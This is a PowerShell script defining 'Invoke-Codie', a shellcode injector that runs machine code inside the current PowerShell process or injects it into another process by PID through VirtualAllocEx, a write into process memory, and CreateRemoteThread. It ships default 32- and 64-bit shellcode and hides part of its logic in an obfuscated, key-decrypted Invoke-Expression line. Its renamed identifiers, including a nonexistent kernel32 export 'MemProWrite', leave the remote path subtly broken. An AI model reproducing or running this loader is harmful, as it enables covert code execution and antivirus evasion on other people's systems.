function Invoke-Codie
{

[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    $ProID,
    
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Codie,
    
    [Switch]
    $Force = $False
)

    Set-StrictMode -Version 2.0

    if ( $PSBoundParameters['ProID'] )
    {
        
        Get-Process -Id $ProID -ErrorAction Stop | Out-Null
    }
    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        ieX ( (NEw-obJEcT MaNAgeMEnt.aUTOMATioN.PSCrEDENtIal  ' ', ('76492d1116743f0423413b16050a5345MgB8AE0ATQBWAGQAYgBhAEwAMABZADUAeABPAG8AMgBkADEAeAB3AFQAWAA1AEEAPQA9AHwAOAA4AGYAZgBkAGIAMAA1AGEAZAAxADcANwAzAGMAZQBmADgANwBmAGQAOQAyADkAMAAxAGQAOQA3AGEAMwBiADgANABhAGMANQAzADYAMQBmADUAMQAyAGEANABiADEAOQBhAGQAYgA5AGUAZgBjADgAZgA1ADgAOABhADcAZAA1AGMANwBlADUAZQA3AGUANABhADAANQBjADQANAA5ADQANwBiAGQANABhADYAZAA3AGIAMwA4AGMANwA1AGMANgA3AGEAOABiAGEAMAA1ADQAZQAyADkANAAxADUAMABlAGIAMABkADgAYQBjADcAOQA0AGQAOQBhADQAZgA4ADEAZAA0AGIAMgBjAGEAMwA0ADMAMwBmADMAZQBiAGEAMQBjADAAYQBjADgANgBmADYAOABmADQAYwA3AGQAMAAxAGUANgBmAGYAYwA2ADEAYQA0ADYAZAAyADAANwBlADkAYgA0AGMAYQA3AGEAYgA1AGUAOAA4ADAAOQA3ADIAZQA2AGYAMAA4AGQANwBmADUANgAzADYANwA1AGIANwBhADIANQBmADMANQBhADUAOABmADUAMgBmADcAZABmAGMAYQAwADEAYgA0ADIAMQA1ADYAMQAwAGUAOAA3AGYAMQA5ADQAYwA4AGYAOAAzAGYAYwAyADcAZQAyAGMANgBhAGEANQAxAGMAMAA1AGIAYgA0AGIAYwA3AGUAMABlADAANQA5ADcAYgBjAGQAMAA0AGIANgA0AGQAMQA2AGUAMwA0AGQAOQA2ADIANgAzAGQAMAA5AGQAMABkADYANQA2AGIAOQAzADgANAA2AGYAMQA3ADEAYgBlAGMAZgA1ADIAZQAxAGIAZQBhAGYAOQA1ADcAYQA4AGQAOQA1ADAAMwA0AGUANwAzADQAOAA0ADIAMwAxADMAOQBiADAANQA2ADgANABjAGYAZQA0ADEAYQBhAGIAMgA4ADIAMwAwADYANQA4ADgANgA2ADEANAAxADIANQA0ADkAZAAyADcAOABkAGMAOAA0AGMAYQAxAGIAYgBmADIAYwBhADcAYwAwADMANQBkADcAZAA0ADAAZgA0AGMAZQAzADYANwA1ADcANwA2ADkANQBhADMAOAA1AGYAMgBjADAAOQAyADUAMAA3ADEAOABiAGMAZgA2ADAANQA2ADQAMQBkAGYAMwA5ADcAYwA5AGYAOQAxADgAMwBkADUAMwA3ADEAZQAzADUANQBhAGUANgBjADAAZQBjAGYAZgA4ADkAOAA0ADIAYQA0ADMAZgBhADIAYQBjAGYANwBhADAAMwA2ADEAYQA0ADUAMwBhADUAMgBjAGMAYwAzADUANwBjAGUANgBhADMAZgBmADcAZQBjADcAMQBiADkAYwA4ADMAOQBhADIAMQA1AGEAYgA0ADgAYQBhADQAYQBiAGYANwA0AGMAZgA='|COnvertto-SECUREstriNG -kE 229,246,240,34,249,250,114,80,110,234,230,60,76,212,101,119,171,157,77,181,89,19,164,20)).GeTNetwoRkCrEDEnTiAL().pASSWoRd )
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )


        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
     
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
      
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
       
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

  
    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        $IntSizePtr = $Architecture / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
        {
            $LittleEndianByteArray = New-Object Byte[](0)
            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($LittleEndianByteArray)
            
            Write-Output $LittleEndianByteArray
        }
        
        $StubbyCall = New-Object Byte[](0)
        
        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $StubbyCall = 0x48,0xB8                    
            $StubbyCall += ConvertTo-LittleEndian $BaseAddr    
            $StubbyCall += 0xFF,0xD0                            
            $StubbyCall += 0x6A,0x00                          
            $StubbyCall += 0x48,0xB8                             
            $StubbyCall += ConvertTo-LittleEndian $ExitThreadAddr
            $StubbyCall += 0xFF,0xD0                            
        }
        else
        {
            [Byte[]] $StubbyCall = 0xB8                         
            $StubbyCall += ConvertTo-LittleEndian $BaseAddr       
            $StubbyCall += 0xFF,0xD0                             
            $StubbyCall += 0x6A,0x00                             
            $StubbyCall += 0xB8                                  
            $StubbyCall += ConvertTo-LittleEndian $ExitThreadAddr 
            $StubbyCall += 0xFF,0xD0                             
        }
        
        Write-Output $StubbyCall
    }

    function Local:Injection-CodieRemote ([Int] $ProID)
    {
       
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProID) 
        
        if (!$hProcess)
        {
            Throw "Unable to open a process handle for PID: $ProID"
        }

        $IsWow64 = $false

        if ($64bitOS)
        {
            
            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
            
            if ((!$IsWow64) -and $PowerShell32bit)
            {
                Throw 'Codie injection targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($IsWow64)
            {
                if ($Codie32.Length -eq 0)
                {
                    Throw 'No Codie was placed in the $Codie32 variable!'
                }
                
                $Codie = $Codie32
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit Codie.'
            }
            else 
            {
                if ($Codie64.Length -eq 0)
                {
                    Throw 'No Codie was placed in the $Codie64 variable!'
                }
                
                $Codie = $Codie64
                Write-Verbose 'Using 64-bit Codie.'
            }
        }
        else
        {
            if ($Codie32.Length -eq 0)
            {
                Throw 'No Codie was placed in the $Codie32 variable!'
            }
            
            $Codie = $Codie32
            Write-Verbose 'Using 32-bit Codie.'
        }

      
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Codie.Length + 1, 0x3000, 0x40) 
        
        if (!$RemoteMemAddr)
        {
            Throw "Unable to allocate Codie memory in PID: $ProID"
        }
        
        Write-Verbose "Codie memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

       
        $MemProWrite.Invoke($hProcess, $RemoteMemAddr, $Codie, $Codie.Length, [Ref] 0) | Out-Null

       
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

        if ($IsWow64)
        {
           
            $StubbyCall = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            
            $StubbyCall = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        
        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $StubbyCall.Length, 0x3000, 0x40) 
        
        if (!$RemoteStubAddr)
        {
            Throw "Unable to allocate thread call stub memory in PID: $ProID"
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"

      
        $MemProWrite.Invoke($hProcess, $RemoteStubAddr, $StubbyCall, $StubbyCall.Length, [Ref] 0) | Out-Null

     
        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
        
        if (!$ThreadHandle)
        {
            Throw "Unable to launch remote thread in PID: $ProID"
        }

       
        $CloseHandle.Invoke($hProcess) | Out-Null

        Write-Verbose 'Codie injection complete!'
    }

    function Local:Injection-CodieLocal
    {
        if ($PowerShell32bit) {
            if ($Codie32.Length -eq 0)
            {
                Throw 'No Codie was placed in the $Codie32 variable!'
                return
            }
            
            $Codie = $Codie32
            Write-Verbose 'Using 32-bit Codie.'
        }
        else
        {
            if ($Codie64.Length -eq 0)
            {
                Throw 'No Codie was placed in the $Codie64 variable!'
                return
            }
            
            $Codie = $Codie64
            Write-Verbose 'Using 64-bit Codie.'
        }
    
       
        $AddyBasey = $VirtualAlloc.Invoke([IntPtr]::Zero, $Codie.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$AddyBasey)
        {
            Throw "Unable to allocate Codie memory in PID: $ProID"
        }
        
        Write-Verbose "Codie memory reserved at 0x$($AddyBasey.ToString("X$([IntPtr]::Size*2)"))"

        
        [System.Runtime.InteropServices.Marshal]::Copy($Codie, 0, $AddyBasey, $Codie.Length)
        
      
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
        
        if ($PowerShell32bit)
        {
            $StubbyCall = Emit-CallThreadStub $AddyBasey $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            $StubbyCall = Emit-CallThreadStub $AddyBasey $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

      
        $StubbyCallPointer = $VirtualAlloc.Invoke([IntPtr]::Zero, $StubbyCall.Length + 1, 0x3000, 0x40)
        if (!$StubbyCallPointer)
        {
            Throw "Unable to allocate thread call stub."
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($StubbyCallPointer.ToString("X$([IntPtr]::Size*2)"))"

    
        [System.Runtime.InteropServices.Marshal]::Copy($StubbyCall, 0, $StubbyCallPointer, $StubbyCall.Length)

       
        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $StubbyCallPointer, $AddyBasey, 0, [IntPtr]::Zero)
        if (!$ThreadHandle)
        {
            Throw "Unable to launch thread."
        }

        
        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
        
        $VirtualFree.Invoke($StubbyCallPointer, $StubbyCall.Length + 1, 0x8000) | Out-Null 
        $VirtualFree.Invoke($AddyBasey, $Codie.Length + 1, 0x8000) | Out-Null 

        Write-Verbose 'Codie injection complete!'
    }

   
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process

    $AddressWidth = $null

    try {
        $AddressWidth = @(Get-WmiObject -Query 'SELECT AddressWidth FROM Win32_Processor')[0] | Select-Object -ExpandProperty AddressWidth
    } catch {
        throw 'Unable to determine OS processor address width.'
    }

    switch ($AddressWidth) {
        '32' {
            $64bitOS = $False
        }

        '64' {
            $64bitOS = $True

            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	    $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        }

        default {
            throw 'Invalid OS address width detected.'
        }
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }

    if ($PSBoundParameters['Codie'])
    {
        
        [Byte[]] $Codie32 = $Codie
        [Byte[]] $Codie64 = $Codie32
    }
    else
    {
       
        [Byte[]] $Codie32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                  0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
                                  0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
                                  0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,
                                  0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,
                                  0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
                                  0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
                                  0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,
                                  0x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,
                                  0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
                                  0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                  0x61,0x6c,0x63,0x00)

        
        [Byte[]] $Codie64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                  0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                  0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                  0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                                  0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                                  0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                                  0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                                  0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                                  0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                                  0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                                  0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                                  0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                                  0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                                  0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
                                  0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                                  0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                                  0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)
    }

    if ( $PSBoundParameters['ProID'] )
    {
       
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll MemProWrite
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $MemProWrite = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    
        Write-Verbose "Injecting Codie into PID: $ProID"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting Codie injecting into $((Get-Process -Id $ProID).ProcessName) ($ProID)!" ) )
        {
            Injection-CodieRemote $ProID
        }
    }
    else
    {
       
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        
        Write-Verbose "Injecting Codie into PowerShell"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting Codie into the running PowerShell process!" ) )
        {
            Injection-CodieLocal
        }
    }   
}